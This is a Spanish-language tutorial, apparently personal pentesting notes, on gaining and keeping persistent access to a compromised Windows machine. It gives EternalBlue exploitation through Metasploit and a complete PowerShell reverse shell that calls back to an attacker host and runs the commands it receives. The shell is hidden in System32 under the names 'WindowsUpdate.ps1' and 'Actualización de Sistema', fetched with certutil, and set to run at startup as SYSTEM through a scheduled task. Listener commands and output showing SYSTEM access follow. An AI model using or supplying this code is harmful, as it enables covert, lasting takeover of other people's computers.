# Shell Persistente mediante PowerShell Windows

### Intrusion a la maquina (Ejemplo)

Primero tendremos que comprometer una maquina `windows`, por ejemplo pongamos que es vulnerable al `Eternal Blue`, abriremos `metasploit`.

```shell
msfconsole -q
```

Una vez dentro ejecutamos los siguientes comandos para la intrusion:

```shell
use windows/smb/ms17_010_eternalblue
set RHOST <IP_VICTIM>
exploit
```

Una vez que estemos dentro, programaremos los scripts en nuestra maquina atacante...

### Scripts para persistencia mediante PowerShell

Codigo `WindowsUpdate.ps1` para hacernos la `reverse shell` desde windows:

```powershell
while ($true) {
    try {
        # Intenta conectarse al puerto especificado
        $client = New-Object System.Net.Sockets.TcpClient("<IP>", <PORT>)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)

        # Escribe una línea indicando la conexión
        $writer.WriteLine("Conexión establecida desde $($env:COMPUTERNAME)")

        # Bucle de comandos
        while ($true) {
            # Espera un comando del cliente
            $writer.Write("shell> ")  # Indica que está listo para recibir un comando
            $cmd = $reader.ReadLine()
            
            if ($cmd -eq 'exit') {
                $writer.WriteLine("Cerrando conexión...")
                break
            }

            try {
                # Ejecuta el comando y captura la salida
                $output = Invoke-Expression $cmd 2>&1

                # Convierte la salida a cadena y envía de vuelta al cliente
                if ($output -is [System.Array]) {
                    $output = $output -join "`n"  # Unir elementos del array en líneas
                }
                
                # Envía la salida de vuelta al cliente
                if ($output) {
                    $writer.WriteLine($output)
                } else {
                    $writer.WriteLine("Comando ejecutado correctamente.")
                }
            }
            catch {
                # Manejo de errores
                $writer.WriteLine("Error: $_")
            }
        }

        # Cierra la conexión
        $client.Close()
    }
    catch {
        # Espera 5 segundos antes de volver a intentar si falla
        Start-Sleep -Seconds 5
    }
}
```

Cambiar `<IP>` y `<PORT>` por las necesidades de cada uno.

Despues crear `Update.ps1` que sera el que ejecute en bucle el archivo `WindowsUpdate.ps1`:

```powershell
while ($true) {
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\WindowsUpdate.ps1
    Start-Sleep -Seconds 5
}
```

### Pasar scripts a la maquina victima mediante metasploit

Tendremos que pasar esos archivos a la maquina victima, en mi caso lo llevare a `C:\Windows\System32` para que se quede bien camuflado.

```shell
cd C:\Windows\System32\
```

Si estamos en `metasploit` con la maquina comprometida podremos subirlos de la siguiente forma:

```shell
upload WindowsUpdate.ps1
upload Update.ps1
```

Despues ejecutaremos `shell`, para obtener la `shell` de `windows`.

### Pasar scripts a la maquina victima mediante terminal

Imaginemos que no estamos utilizando `metasploit` lo podremos hacer de esta otra forma...

Primero nos abriremos un servidor de `python3`.

```shell
python3 -m http.server
```

En la maquina victima que habremos comprometido de `windows` con una `shell` normal, pondremos los sigueintes comandos:

```shell
cd C:\Windows\System32\
certutil.exe -f -urlcache -split http://<IP>:8000/WindowsUpdate.ps1 WindowsUpdate.ps1
certutil.exe -f -urlcache -split http://<IP>:8000/Update.ps1 Update.ps1
```

Asi nos pasaremos los 2 archivos a la maquina victima.

### Programar persistencia en la maquina victima

Despues en la maquina `windows` que tenemos comprometida, ejecutaremos el siguiente comando:

```shell
schtasks /create /tn "Actualización de Sistema" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\WindowsUpdate.ps1" /sc onstart /ru "SYSTEM" /rl highest /f
```

Info:

```
schtasks /create /tn "Actualización de Sistema" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\Update.ps1" /sc onstart /ru "SYSTEM" /rl highest /f
Correcto: se cre correctamente la tarea programada "Actualización de Sistema".
```

Con esto ya habriamos creado la tarea programada en `windows`, lo comprobaremos de la siguiente forma:

```shell
schtasks /query /tn "Actualización de Sistema"
```

Info:

```
Carpeta: \
Nombre de tarea                          Hora prxima ejecucin Estado         
======================================== ====================== ===============
Actualización de Sistema                 No disponible          Listo          
```

Despues probaremos a estar a la escucha en nuestra maquina atacante:

```shell
nc -lvnp <PORT>
```

Y en la maquina victima ejecutaremos el siguiente codigo para saber que todo se carga correctamente:

```shell
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\WindowsUpdate.ps1
```

Una vez comprobado, ya podremos reiniciar el equipo, hacer lo que queramos, hacerle `Ctrl+C` a la `shell` y volver a estar a la escucha para otra vez recuperarla, ya tendremos `persistencia`.

### Escucha mediante terminal

Ahora podremos obtener la `shell` todas las veces que queramos por que se estara ejecutando cada 5 segundos, por lo que solo tendremos que poner el siguiente comando:

```shell
nc -lvnp <PORT>
```

Y todas las veces que pongamos eso nos hara una `shell` cada 5 segundos, aunque reinicie el sistema y vuelva a ejecutarse `windows` podremos seguir obteniendola.

Info:

```
listening on [any] 7777 ...
connect to [192.168.5.147] from (UNKNOWN) [192.168.5.141] 49193
ConexiÃ³n establecida desde VULN-SMBV2
shell> whoami
nt authority\system
```

### Escucha mediante metasploit

Tambien lo podemos hacer mediante `metasploit`.

```shell
msfconsole -q
```

Una vez dentro ejecutaremos los siguiente comandos:

```shell
use multi/handler
set LHOST <IP>
set LPORT <PORT>
run
```

Y con esto obtendremos una `shell` mediante `metasploit`.

### Eliminar la tarea persistente y los scripts

Pondremos los siguientes comandos dentro de la maquina `windows`:

```shell
del WindowsUpdate.ps1
del Update.ps1
schtasks /delete /tn "Actualización de Sistema" /f
```

Y con esto ya habriamos dejado limpio el sistema.
